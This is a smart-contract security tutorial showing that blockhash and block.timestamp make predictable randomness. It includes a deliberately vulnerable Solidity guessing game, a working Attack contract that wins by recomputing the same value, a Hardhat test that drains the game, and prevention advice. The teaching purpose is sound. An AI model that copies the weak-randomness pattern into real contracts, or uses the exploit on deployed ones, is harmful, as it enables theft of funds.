# Source of Randomness

Today we will learn how using `blockhash` and `block.timestamp` is a false source of randomness

## Requirements

- We will build a game where there is a pack of cards.
- Each card has a number associated with it which ranges from `0 to 2²⁵⁶–1`
- Player will guess a number that is going to be picked up.
- The dealer will then at random pick up a card from the pack
- If someone correctly guesses the number, they win `0.1 ETH`
- We will hack this game today :)

## Build

To build the smart contract we will be using [Hardhat](https://hardhat.org/).
Hardhat is an Ethereum development environment and framework designed for full stack development in Solidity. In simple words you can write your smart contract, deploy them, run tests, and debug your code.

- In you folder, you will set up a Hardhat project

  ```bash
  npm init --yes
  npm install --save-dev hardhat
  ```

- In the same directory where you installed Hardhat run:

  ```bash
  npx hardhat
  ```

  - Select `Create a basic sample project`
  - Press enter for the already specified `Hardhat Project root`
  - Press enter for the question on if you want to add a `.gitignore`
  - Press enter for `Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

Now you have a hardhat project ready to go!

If you are not on mac, please do this extra step and install these libraries as well :)

```bash
npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
```

- Lets first understand what `abi.encodedPacked` does, For that please go ahead and read this [article](https://medium.com/@libertylocked/what-are-abi-encoding-functions-in-solidity-0-4-24-c1a90b5ddce8)

- Create a file named as `Game.sol` inside your `contracts` folder and add the following lines of code.

  ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.4;

    contract Game {
    constructor() payable {}

        /**
            Randomly picks a number out of `0 to 2²⁵⁶–1`.
        */
        function pickACard() private view returns(uint) {
            // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
            // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
            // which is further converted to a `uint`.
            // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
            uint pickedCard = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
            return pickedCard;
        }

        /**
            It begins the game by first choosing a ramdom number by calling `pickACard`
            It then verifies if the random number selected is equal to `_guess` passed by the player
            If the player guessed the correct number, it sends the player `0.1 ether`
        */
        function guess(uint _guess) public {
            uint _pickedCard = pickACard();
            if(_guess == _pickedCard){
                (bool sent,) = msg.sender.call{value: 0.1 ether}("");
                require(sent, "Failed to send ether");
            }
        }

        /**
            Returns the balance of ether in the contract
        */
        function getBalance() view public returns(uint) {
            return address(this).balance;
        }

    }
  ```

- Now create a file called as `Attack.sol` inside your `contracts` folder and add the following lines of code.

  ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.4;

    import "./Game.sol";

    contract Attack {
        Game game;
        /**
            Creates an instance of Game contract with the help of `gameAddress`
        */
        constructor(address gameAddress) {
            game = Game(gameAddress);
        }

        /**
            attacks the `Game` contract by guessing the exact number because `blockhash` and `block.timestamp`
            is accessible publically
        */
        function attack() public {
            // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
            // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
            // which is further converted to a `uint`.
            // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
            uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
            game.guess(_guess);
        }

        // Gets called when the contract recieves ether
        receive() external payable{}
    }
  ```

- How the attack takes place is as follows:

  - The hacker calls the `attack` function from the `Attack.sol`
  - `attack` further guesses the number using the same method as `Game.sol` which is
    `uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)))`
  - Attacker is able to guess the same number because blockhash and block.timestamp is public information and everybody has access to it
  - The attacker then calls the `guess` function from `Game.sol`
  - `guess` first calls the `pickACard` function which generates the same number using `uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)))` because `pickACard` and `attack` were both called in the same block.
  - `guess` compares the numbers and they turn out to be the same.
  - `guess` then sends the `Attack.sol` `0.1 ether` and the game ends
  - Attacker is successfully able to guess the random number

- Now lets write some tests to verify if it works exactly as we hoped.

- Create a new file named `attack.js` inside the `test` folder and add the following lines of code

  ```javascript
  const { ethers, waffle } = require("hardhat");
  const { expect } = require("chai");
  const { BigNumber, utils } = require("ethers");

  describe("Attack", function () {
    it("Should be able to guess the exact number", async function () {
      // Deploy the Game contract
      const Game = await ethers.getContractFactory("Game");
      const _game = await Game.deploy({ value: utils.parseEther("0.1") });
      await _game.deployed();

      console.log("Game contract address", _game.address);

      // Deploy the attack contract
      const Attack = await ethers.getContractFactory("Attack");
      const _attack = await Attack.deploy(_game.address);

      console.log("Attack contract address", _attack.address);

      // Attack the Game contract
      const tx = await _attack.attack();
      await tx.wait();

      const balanceGame = await _game.getBalance();
      // Balance of the Game contract should be 0
      expect(balanceGame).to.equal(BigNumber.from("0"));
    });
  });
  ```

- Now open up a terminal pointing to `Source-of-Randomness` folder and execute this

  ```bash
  npx hardhat compile
  ```

- If all your tests passed, you have sucessfully completed the hack :)

## Preventions

- Don't use `blockhash` and `block.timestamp` as source of randomness
- You can use [Chainlink VRF's](https://docs.chain.link/docs/chainlink-vrf/) for true source of randomness
